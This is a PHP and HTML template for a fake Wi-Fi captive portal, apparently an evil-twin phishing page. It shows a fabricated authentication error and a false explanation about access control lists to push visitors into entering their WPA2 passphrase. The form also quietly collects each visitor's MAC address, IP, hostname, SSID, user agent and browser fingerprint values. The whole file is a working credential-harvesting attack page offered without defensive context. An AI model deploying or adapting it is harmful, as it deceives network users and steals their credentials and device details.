<?php
$destination = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "";
require_once('helper.php');
require_once('visited.php');
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Pragma: no-cache");
header("Expires: 0");
?>

<iframe name="login" id="login" style="display: none;"></iframe>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />
    <link rel="stylesheet" href="/css/bootstrap-4.3.1.min.css">
    <link rel="stylesheet" href="/css/bootstrap-icons.css">
    <script type="text/javascript" src="/js/jquery-3.7.1.min.js"></script>
    <script type="text/javascript" src="/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="/style.css">
    <script type="text/javascript" src="/func.js"></script>
    <title><?= $ssid ?></title>
</head>

<body>
    <div class="container mt-5">
        <div class="form-row justify-content-center">
            <div class="col-md-6">
                <div class="card rounded-lg border-light shadow">
                    <div class="card-body text-center">
                        <img src="airport-logo.png" class="img-fluid mb-3" style="max-width: 200; max-height: 100px; object-fit: contain;">
                        <h3 class="card-title text-center"><?= $ssid; ?></h3>
                        <p class="text-center small mb-5">It look’s like you need to be authorised to use this Wireless Access Point.</p>
                        <form method="POST" action="/captiveportal/index.php" onsubmit="submitForm()" target="login" id="loginForm">
                            <div class="d-flex justify-content-center">
                                <div class="form-group mb-4" style="width: 100%; max-width: 600px;">
                                    <label for="password" class="d-block text-left">Passphrase:</label>
                                    <div class="input-group">
                                        <input type="password" class="form-control" id="password" name="password" placeholder="WPA2 Passphrase" autocomplete="current-password" required>
                                        <div class="input-group-append">
                                            <span class="input-group-text">
                                                <i id="showPasswordIcon" class="bi bi-eye-fill" onclick="togglePassword()"></i>
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div id="loading-message" class="text-center mt-3 mb-3 font-weight-bold"></div>
                            <input type="hidden" name="ssid" value="<?=getClientSSID($_SERVER['REMOTE_ADDR']);?>">
                            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                            <input type="hidden" name="useragent" value="<?= htmlspecialchars($_SERVER['HTTP_USER_AGENT']); ?>">
                            <input type="hidden" id="SR" name="SR" value="">
                            <input type="hidden" id="OS" name="OS" value="">
                            <input type="hidden" id="WB" name="WB" value="">
                            <input type="hidden" id="AT" name="AT" value="">
                            <input type="hidden" id="CC" name="CC" value="">
                            <script type="text/javascript">GSR(); GOS(); GWB(); GAT(); GCC();</script>
                            <div class="d-flex justify-content-center">
                                <button type="submit" class="btn btn-orange text-white">Login</button>
                             </div>
                            <div class="form-group form-check text-left mt-2">
                            <input type="checkbox" class="form-check-input" id="ACLAllow" name="ACLAllow" value="0">
                            <label class="form-check-label" for="ACLAllow">Add MAC to ALC Allow List</label>
                            </div>
                        </form>
                        <p class="text-left small text-muted mt-4 d-flex justify-content-between align-items-center">
                            STATUS: ERR_FAILED_AUTH
                        <p class="text-left small text-muted d-flex justify-content-between align-items-center">
                            Client MAC: <?=getClientMac($_SERVER['REMOTE_ADDR']);?>
                            <a href="#" class="popover-link first-popover" data-container="body" data-html="true" data-toggle="popover" data-placement="top" data-content="This has happened due to the Access Control List (ACL) settings implemented on the Wireless Access Point. This requires devices to re-authenticate themselves which will query the Access Point ACL. If your device is authorised to access this network, your device MAC will be allowed upon re-authentication via this Wireless Access Points integrated captive portal. Which is where you are seeing this message." title="ERR_FAILED_AUTH" data-trigger="focus" tabindex="0">Why did this happen?</a>
                       </p>
                       </p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <p class="text-left small d-flex justify-content-center align-items-center">
        <a href="#" class="popover-link second-popover" data-container="body" data-html="true" data-toggle="popover" data-placement="top" data-content="You are not authorised to view router status." title="ERR_GET_STATUS" data-trigger="focus" tabindex="0"> Check Router Status</a>
    </p>

</body>
</html>
